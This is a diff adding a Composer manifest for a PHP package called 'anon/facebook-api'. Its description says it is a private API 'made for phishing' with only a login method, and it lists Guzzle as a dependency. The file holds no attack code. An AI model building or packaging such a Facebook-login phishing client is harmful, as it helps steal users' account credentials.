@@ -1,0 +1,16 @@
+{
+  "name": "anon/facebook-api",
+  "description": "Private API made for phishing and has just login method",
+  "type": "project",
+  "license": "MIT",
+  "minimum-stability": "beta",
+  "require": {
+    "guzzlehttp/guzzle": "~6.0",
+    "lazyjsonmapper/lazyjsonmapper": "^1.6"
+  },
+  "autoload": {
+    "psr-4": {
+      "facebookAPI\\": "src/"
+    }
+  }
+}
